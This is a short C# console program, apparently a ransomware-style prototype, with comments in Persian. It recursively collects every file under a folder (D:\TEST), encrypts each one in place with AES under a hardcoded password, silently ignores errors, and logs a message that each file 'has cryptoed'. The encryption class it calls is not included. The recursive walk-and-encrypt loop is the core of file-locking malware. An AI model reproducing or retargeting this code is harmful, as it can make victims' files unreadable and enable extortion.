using System;
using System.Collections.Generic;
using System.IO;

using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace WARM_2
{
    class Program
    {
        public static string msg;
        static void Main()
        {
            
           
            msg = string.Empty;
            foreach (string file in GetFiles(@"D:\TEST"))
            {
                Console.WriteLine(file);
               msg= "=>" + msg + file + " has cryptoed"+"/n";

                try
                {
                   
                    var filePath = file;
                    var password ="ma.orojloo";
                    // برای آن که برنامه در هنگام عملیات رمزگذاری قفل نشود
                    //  متد زیر را با استفاده از Task فراخوانی می کنیم
                  AesCryptography.EncryptFile(filePath, password);
                    Console.WriteLine("done");
                }
                catch (Exception ex)
                {
                    
                }


            }
        }





        static IEnumerable<string> GetFiles(string path)
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (string subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex);
                }
                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex);
                }
                if (files != null)
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        yield return files[i];
                    }
                }
            }
        }
    }
}
